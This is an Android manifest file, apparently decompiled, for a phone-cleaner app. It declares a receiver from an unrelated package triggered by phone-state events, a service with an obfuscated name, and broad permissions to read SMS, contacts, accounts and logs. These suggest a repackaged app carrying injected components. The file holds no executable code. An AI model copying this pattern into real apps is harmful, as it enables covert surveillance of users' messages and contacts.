<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="cn.com.opda.android.super.clearmaster">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:name="cn.com.opda.android.clearmaster.MainTabActivity" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="cn.com.opda.android.clearmaster.SMSDetailListActivity" android:screenOrientation="portrait"/>
        <activity android:name="cn.com.opda.android.clearmaster.CacheListActivity" android:screenOrientation="portrait"/>
        <activity android:name="cn.com.opda.android.clearmaster.SMSManageConVersationListActivity" android:screenOrientation="portrait"/>
        <activity android:name="cn.opda.android.CleanUpTool.Ui.CleanUp_Activity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.google.ads.AdActivity"/>
        <meta-data android:name="UMENG_APPKEY" android:value="4cd8b7ee3ea7a3196c002d94"/>
        <receiver android:name="com.passionteam.lightdd.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <service android:name="ep$pM"/>
    </application>
    <uses-permission android:name="android.permission.GET_TASKS"/>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:resizeable="true" android:smallScreens="true"/>
    <uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
</manifest>